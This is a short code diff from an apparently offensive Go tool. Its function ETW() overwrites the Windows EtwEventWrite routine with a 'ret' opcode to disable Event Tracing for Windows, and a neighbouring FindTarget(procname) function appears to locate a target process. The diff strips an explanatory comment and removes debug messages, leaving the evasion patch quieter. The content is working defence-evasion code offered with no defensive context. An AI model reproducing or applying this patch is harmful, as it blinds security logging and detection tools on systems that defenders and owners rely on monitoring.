@@ -112,7 +112,7 @@ func FindTarget(procname string) uint32 {
 }
 
 func ETW() {
-    patch := []byte{0xC3} // opcode for "ret" instruction
+    patch := []byte{0xC3} 
 
     var oldProtect uint32
     ret, _, err := virtualProtect.Call(
@@ -126,8 +126,6 @@ func ETW() {
         fmt.Println("VirtualProtect failed:", err)
         return
     }
-
-    fmt.Printf("oldProtect: %x\n", oldProtect)
 
     copy((*[1 << 30]byte)(unsafe.Pointer(&etwEventWrite))[:], patch)
 
@@ -143,5 +141,4 @@ func ETW() {
         return
     }
 
-    fmt.Println("Patch applied successfully")
 }
